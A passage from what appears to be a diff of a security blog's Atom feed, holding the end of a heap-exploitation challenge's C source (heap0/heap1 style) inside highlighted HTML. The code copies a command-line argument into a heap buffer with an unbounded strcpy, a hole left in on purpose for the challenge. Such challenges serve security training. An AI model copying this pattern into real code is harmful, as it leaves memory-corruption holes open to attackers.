-  <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v6<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"and that's a wrap folks!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-</code></pre>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;heap0&quot;&gt;&lt;a href=&quot;#heap0&quot; class=&quot;headerlink&quot; title=&quot;heap0&quot;&gt;&lt;/a&gt;heap0&lt;/h2&gt;&lt;p&gt;源代码&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;&lt;p class=&quot;code-caption&quot; data-lang=&quot;c&quot; data-
-    
-    </summary>
-    
-    
-      <category term="Pwn" scheme="http://iosmosis.github.io/tags/Pwn/"/>
-    
-      <category term="heap" scheme="http://iosmosis.github.io/tags/heap/"/>
     
   </entry>
   
